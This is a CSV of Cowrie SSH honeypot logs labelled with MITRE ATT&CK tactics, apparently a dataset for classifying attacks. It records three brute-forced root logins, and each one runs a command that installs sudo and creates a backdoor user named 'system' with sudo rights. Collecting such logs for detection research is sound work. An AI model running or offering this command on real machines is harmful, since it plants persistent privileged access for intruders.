,event,session_id,session,labels
1526,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T01:50:51.865340Z"", ""session_id"": ""e09fdaddf823""}",e09fdaddf823,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ebf4GNDT) system  && sudo usermod -aG sudo system ; openssl passwd -1 ebf4GNDT;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1527,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T01:50:51.906788Z"", ""username"": ""root"", ""session_id"": ""e09fdaddf823""}",e09fdaddf823,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ebf4GNDT) system  && sudo usermod -aG sudo system ; openssl passwd -1 ebf4GNDT;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1528,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T01:50:51.977220Z"", ""session_id"": ""e09fdaddf823""}",e09fdaddf823,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ebf4GNDT) system  && sudo usermod -aG sudo system ; openssl passwd -1 ebf4GNDT;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1529,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ebf4GNDT) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ebf4GNDT) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T01:50:51.977842Z"", ""session_id"": ""e09fdaddf823""}",e09fdaddf823,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ebf4GNDT) system  && sudo usermod -aG sudo system ; openssl passwd -1 ebf4GNDT;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1530,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 ebf4GNDT"", ""message"": ""CMD: openssl passwd -1 ebf4GNDT"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T01:50:51.978446Z"", ""session_id"": ""e09fdaddf823""}",e09fdaddf823,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ebf4GNDT) system  && sudo usermod -aG sudo system ; openssl passwd -1 ebf4GNDT;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1531,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 ebf4GNDT"", ""message"": ""Command not found: openssl passwd -1 ebf4GNDT"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T01:50:51.979200Z"", ""session_id"": ""e09fdaddf823""}",e09fdaddf823,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ebf4GNDT) system  && sudo usermod -aG sudo system ; openssl passwd -1 ebf4GNDT;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1532,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/dced052900a8e1a8abbd9c8472ed1b9e4f75e2fa321bc1fa8522013bd3f08d35 after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""dced052900a8e1a8abbd9c8472ed1b9e4f75e2fa321bc1fa8522013bd3f08d35"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T01:50:51.992533Z"", ""ttylog"": ""var/lib/cowrie/tty/dced052900a8e1a8abbd9c8472ed1b9e4f75e2fa321bc1fa8522013bd3f08d35"", ""session_id"": ""e09fdaddf823""}",e09fdaddf823,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ebf4GNDT) system  && sudo usermod -aG sudo system ; openssl passwd -1 ebf4GNDT;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1533,"{""duration"": ""0.1"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.1 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T01:50:51.993384Z"", ""session_id"": ""e09fdaddf823""}",e09fdaddf823,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ebf4GNDT) system  && sudo usermod -aG sudo system ; openssl passwd -1 ebf4GNDT;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1534,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:63008 (10.42.4.33:2222) [session: f01929aa2481]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 63008.0, ""timestamp"": ""2025-08-09T11:34:35.402992Z"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1535,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:35.403692Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1536,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:35.507060Z"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1537,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:35.820147Z"", ""username"": ""root"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1538,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:36.050918Z"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1539,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:36.051357Z"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1540,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 aea2CVTv"", ""message"": ""CMD: openssl passwd -1 aea2CVTv"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:36.051880Z"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1541,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 aea2CVTv"", ""message"": ""Command not found: openssl passwd -1 aea2CVTv"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:36.052563Z"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1542,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/88fb5b7478c53cd036b5792ac81506a440af6e84e1b9afad893982910745fa0a after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""88fb5b7478c53cd036b5792ac81506a440af6e84e1b9afad893982910745fa0a"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:36.157672Z"", ""ttylog"": ""var/lib/cowrie/tty/88fb5b7478c53cd036b5792ac81506a440af6e84e1b9afad893982910745fa0a"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1543,"{""duration"": ""0.8"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.8 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:36.158465Z"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1544,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:43034 (10.42.4.33:2222) [session: c45d238cffda]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 43034.0, ""timestamp"": ""2025-08-07T03:08:07.511174Z"", ""session_id"": ""c45d238cffda""}",c45d238cffda,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WsxVa2Ma) system  && sudo usermod -aG sudo system ; openssl passwd -1 WsxVa2Ma;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1545,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T03:08:07.511581Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""c45d238cffda""}",c45d238cffda,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WsxVa2Ma) system  && sudo usermod -aG sudo system ; openssl passwd -1 WsxVa2Ma;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1546,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T03:08:07.701146Z"", ""session_id"": ""c45d238cffda""}",c45d238cffda,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WsxVa2Ma) system  && sudo usermod -aG sudo system ; openssl passwd -1 WsxVa2Ma;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1547,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T03:08:08.133401Z"", ""username"": ""root"", ""session_id"": ""c45d238cffda""}",c45d238cffda,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WsxVa2Ma) system  && sudo usermod -aG sudo system ; openssl passwd -1 WsxVa2Ma;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1548,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T03:08:08.443312Z"", ""session_id"": ""c45d238cffda""}",c45d238cffda,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WsxVa2Ma) system  && sudo usermod -aG sudo system ; openssl passwd -1 WsxVa2Ma;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1549,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 WsxVa2Ma) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 WsxVa2Ma) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T03:08:08.443674Z"", ""session_id"": ""c45d238cffda""}",c45d238cffda,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WsxVa2Ma) system  && sudo usermod -aG sudo system ; openssl passwd -1 WsxVa2Ma;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1550,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 WsxVa2Ma"", ""message"": ""CMD: openssl passwd -1 WsxVa2Ma"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T03:08:08.444495Z"", ""session_id"": ""c45d238cffda""}",c45d238cffda,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WsxVa2Ma) system  && sudo usermod -aG sudo system ; openssl passwd -1 WsxVa2Ma;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1551,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 WsxVa2Ma"", ""message"": ""Command not found: openssl passwd -1 WsxVa2Ma"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T03:08:08.445118Z"", ""session_id"": ""c45d238cffda""}",c45d238cffda,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WsxVa2Ma) system  && sudo usermod -aG sudo system ; openssl passwd -1 WsxVa2Ma;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1552,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/47b58f3e585c40a21b96bdaef9365d74f6745aa2071c5cee1a65ba4da0b3d4df after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""47b58f3e585c40a21b96bdaef9365d74f6745aa2071c5cee1a65ba4da0b3d4df"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T03:08:08.550500Z"", ""ttylog"": ""var/lib/cowrie/tty/47b58f3e585c40a21b96bdaef9365d74f6745aa2071c5cee1a65ba4da0b3d4df"", ""session_id"": ""c45d238cffda""}",c45d238cffda,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WsxVa2Ma) system  && sudo usermod -aG sudo system ; openssl passwd -1 WsxVa2Ma;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
1553,"{""duration"": ""1.0"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 1.0 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T03:08:08.551050Z"", ""session_id"": ""c45d238cffda""}",c45d238cffda,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 WsxVa2Ma) system  && sudo usermod -aG sudo system ; openssl passwd -1 WsxVa2Ma;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
